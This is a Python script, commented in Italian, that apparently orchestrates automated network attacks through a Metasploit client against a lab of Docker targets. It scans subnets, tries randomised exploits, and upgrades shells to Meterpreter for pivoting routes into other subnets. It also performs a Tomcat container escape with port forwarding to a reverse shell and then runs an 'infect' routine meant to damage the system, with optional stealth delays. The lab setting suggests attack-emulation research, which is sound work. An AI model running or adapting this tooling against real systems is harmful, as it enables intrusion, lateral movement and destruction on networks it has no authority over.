import json
import random
import ipaddress
from MetaClient import MetaClient,BackdoorCommander
from util import Logger,Constants as C
from attack import Attack,Metasploit_Attack,ResourceAttack,SshAttack,Attack_DB
from time import sleep


#Viene recuperato l'elenco degli ip dei target da config_file e viene salvato in machine, se i target sono in un'altra subnet vengono salvati anche in other_subnet
#Inizialmente l'unica macchina di cui si ha il controllo è quella su cui gira l'attaccante
#Il server Metasploit gira sulla stessa macchina dell'attaccante, creando un istanza di Metaclient ci si connette a questo server
#Si itera sulle macchine target
    #Ad ogni iterazione vengono recuperati la lista degli attacchi e la lista delle scansioni (o scansioni stealth) da attack_db.json 
    #Viene selezionata casualmente una scansione dalla lista e se ne recuperano nome, istruzioni, tipo e tempo di attesa
    #A questo punto con queste informazioni si crea un oggetto di tipo Attack passandogli anche la connessione al server metasploit precedentemente creata
    #Se il target è in un altra sottorete rispetto alla macchina attaccante
        #Se non si ha già una sessione attiva non si può effettuare la scansione
        #Se si ha una sessione si fa l'upgrade di questa sessione a una sessione meterpreter
        #Se l'upgrade ha successo, la sessione meterpreter fa da router
            #Si aggiunge una route per raggiungere il target sfruttando la sessione meterpreter
    #Viene effettuata la scansione ma si ignorano i risultati
    #Si itera in ordine casuale sulla lista degli attacchi
        #Si recuperano le informazioni sul docker che gira sulla macchina target che stiamo considerando 
        #Se il docker è vulnerabile all'attacco che stiamo considerando si recuperano le porte dal file config, altrimenti si lasciano le porte di default (tanto in ogni caso l'attacco fallisce)
        #Si costruisce l'oggetto di tipo attacco usando le informazioni estratte
        #Si tenta di attaccare il target con l'oggetto attacco appena creato e si salva la sessione ottenuta se l'attacco ha successo
        #Si controlla se la sessione ottenuta non sia un falso positivo 
        #La sessione ottenuta diventa la sessione di attacco corrente
        #La macchina target viene inserita tra le macchine compromesse 
        #Se l'attacco che ha avuto successo era un docker_escape da tomcat viene fatto port forwarding per ottenere accesso alla macchina in un altra sottorete dalla macchina attaccante
    #Se non si è stati in grado di compromettere un target la procedura di attacco fallisce
        

def main_procedure (attacker_ip, config_file, stealth=False, stealth_sleep=0):

    Logger.init_logger()

    #read the file that contains all the targets
    with open(config_file) as f:
        target_list=json.load(f)
    machines=[]
    other_subnet= dict()
    #save the ip
    for ip in target_list["targets"]:
        machines.append(ip["target"])
        if "other_subnet" in ip:
            other_subnet.update({ip["target"]:ip["other_subnet"]})
    #print(other_subnet)

    router=None
    OOBSession=None
    compromised_machines={attacker_ip}
    uncompromised_machines=set()
    #bc=BackdoorCommander("password",C.BACKDOOR_CLIENT_PORT,attacker_ip)
    mc=MetaClient("password", C.ATTACKER_CLIENT_PORT, attacker_ip)
    atk_sess=None

    while(machines):
        #extract the first victim
        t=machines.pop(0)
        target_ip=t
        print(f"{C.COL_GREEN} [+] target for this step: {target_ip} {C.COL_RESET}")

        attack=list(Attack_DB.attack_dict)

        randomized_attack=random.sample(attack,len(attack))
        
        if(stealth):
            scans=list(Attack_DB.stealth_scans_dict)
        else:
            scans=list(Attack_DB.scans_dict)

        s=random.choice(scans)
        
        if(s != "tcp_portscan"):
            nmap_target=str(ipaddress.IPv4Network(target_ip+"/255.255.0.0", False)).replace("/16","/24")
        else:
            nmap_target=target_ip

        scan_name=Attack_DB.scans_dict[s].attack
        scan_instr=Attack_DB.scans_dict[s].instruction.format(nmap_target,attacker_ip)
        scan_type=Attack_DB.scans_dict[s].attack_type
        scan_wait=Attack_DB.scans_dict[s].wait_time
        scan_obj=Metasploit_Attack(scan_name,scan_instr,scan_wait,mc.client)
        print(f"{C.COL_YELLOW}[*] Scanning for vulnerabilities {C.COL_RESET}")
        
        if(target_ip in other_subnet and other_subnet[target_ip]=="yes"):
            if(atk_sess==None):
                print(f"{C.COL_RED}[-] subnet not reachable, no intermediate session available{C.COL_RESET}") 
                return 
            print(f"{C.COL_YELLOW}[*] other subnet found, adding new routes{C.COL_RESET}")
            met_sess=mc.upgrade_shell(atk_sess)
            if(met_sess):
                print(f"{C.COL_YELLOW}[*] Meterpreter session received, adding routes{C.COL_RESET}")
                mc.client.route_add(met_sess, target_ip)
                mc.client.route_print()
                router=met_sess
            else:
                print(f"{C.COL_RED}[*] Meterpreter session not received, can't add routes, skipping...{C.COL_RESET}")
                continue

    
        mc.attempt_scan(scan_obj)

        for ra in randomized_attack:
            attack_name=Attack_DB.attack_dict[ra].attack
            # 0 se non ci serve connetterci alla backdoor, verrà sovrascritto dal valore presente dentro il file config se presente per quell'attacco
            port=0
            LPORT=0 
            #salviamo le informazioni necessarie per le porte delle backdoor (sulla macchina vittima e sulla macchina attaccante)
            for p in C.TARGETS_DOCKERS[target_ip]:
                if(attack_name in p["attack_list"]):
                    port=p["VM_Port"]
                    LPORT=p["exposed_port"]
                    break
            if(LPORT==0):
                LPORT=C.DEFAULT_LPORT

            #format the string with the ip that need to be used
            attack_instr=Attack_DB.attack_dict[ra].instruction.format(target_ip,attacker_ip,LPORT=LPORT)
            attack_type=Attack_DB.attack_dict[ra].attack_type
            attack_wait=Attack_DB.attack_dict[ra].wait_time
            print(f"{C.COL_GREEN}[+] attacking ({target_ip}) with {attack_name}{C.COL_RESET}")

            if(attack_name=="tomcat_server" and target_ip!=C.TOMCAT_VM):
                print(f"{C.COL_YELLOW}[*] Special attack tomcat_server cannot be done on this machine, skipping... {C.COL_RESET}")
                continue
            if(attack_name=="smtp_server" and target_ip!=C.SMTP_VM):
                print(f"{C.COL_RED}[-] Exploit failed {C.COL_RESET}")
                continue
            if(attack_type=="ResourceAttack"):
                attack_obj=ResourceAttack(attack_name,attack_instr,attack_wait, mc.client)
            elif(attack_type=="SshAttack"):
                attack_obj=SshAttack(attack_name,attack_instr,attacker_ip,OOBSession,attack_wait, mc.client)
            else:
                attack_obj=Metasploit_Attack(attack_name,attack_instr,attack_wait, mc.client)
            

            if(type(attack_obj)==SshAttack and OOBSession==None):
                print(f"{C.COL_RED}[-] can't use OOB attacks without an established session!{C.COL_RESET}")
                continue
            
            session=mc.attempt_attack(attack_obj,port)

            #print(session)
            if(session):
                
                #poiché potrebbero avvenire dei falsi positivi di qualche attacco passato dobbiamo controllare che la sessione
                #trvata sia quella della macchina bersaglio attuale, e non di una vecchia
                if (session[0:1][0] == target_ip):
                #se abbiamo una connessione con la backdoor
                #print(session)
                #if("backdoor_sess" in session[1:2][0]):
                    #sessione della backdoor, potrebbe servire in futuro nel caso in cui si vogliano effettuare operazioni tramite la backdoor
                    #network_passing_session = session[1:2][0]["backdoor_sess"]
                    #id della sessione del client degli attacchi, servirà per i successivi attacchi OOB
                    #print(session[1:2][0]["id_sess"])
                    atk_sess=session[1:2][0]["id_sess"]
                    #print(atk_sess)
                    #TODO: Non essendo stato testato questo tipo di attacco tramite una sessione controllare che la funzione di attacco vada a buon fine
                    #togliendo il commento nella riga sottostante
                    #OOBSession = atk_sess
                    #print(f"OOBSession: {OOBSession}")
                    print(f"{C.COL_GREEN}[+] {target_ip} compromised {C.COL_RESET}")
                    compromised_machines.add(target_ip)
                    
                    if(attack_name=="tomcat_server"):
                        print(f"{C.COL_YELLOW} Tomcat_server vulnerability detected, trying docker escape... {C.COL_RESET}")
                        print(f"{C.COL_YELLOW} For this attack to be successful copy of a file from the container to the host must be attempted on the host {C.COL_RESET}")
                        #prepariamo le regole di port forwarding usando la macchina intermedia su cui l'attacco docker escape si connette
                        #questa macchina intermedia effettuerà un portfwd sulla macchina attaccante permettendoci di ottenere una reverse shell
                        #sulla macchina che è in un'altra sottorete e che normalmente non permetterebbe di ottenere una reverse shell.
                        #verrà inoltre rimossa la regola di routing perché non più necessaria una volta che abbiamo una sessione
                        mc.prepare(router,C.NETCAT_PORT, LPORT, attacker_ip)
                        #tentiamo la connessione da netcat in entrata dall'operazione di copia effettuata da un admin
                        escape=mc.docker_escape(atk_sess)
                        if(escape):
                            print(f"{C.COL_YELLOW} docker_escape successful! Trying damaging the system...  {C.COL_RESET}")
                            mc.infect()
                        else:
                            print(f"{C.COL_RED}docker_escape failed! Aborting...  {C.COL_RESET}")
                            break   
                    break
                """ else:
                        print(f"{C.COL_RED}[-] can't connect to {target_ip}'s backdoor{C.COL_RESET}")
                        break """
                # else:
                #     print(f"{C.COL_YELLOW}[*] false positive occured, ignoring... {C.COL_RESET}")
            else:
                uncompromised_machines.add(target_ip)
                print(f"{C.COL_RED}[-] xx Exploit failed {C.COL_RESET}")

            if stealth_sleep:
                print(f"{C.COL_YELLOW}[*] sleeping {stealth_sleep} seconds to make the attack stealthier...{C.COL_RESET}")
                sleep(stealth_sleep)
        
        print("---------------------------------------------------------")
    
    print(f"{C.COL_GREEN} Attack complete!! {C.COL_RESET}")




#Da config.json viene recuperato l'ip dell'attaccante e lo si passa al main insieme a config.json
if(__name__=='__main__'):
    main_procedure(C.ATTACKER_VM,"config.json")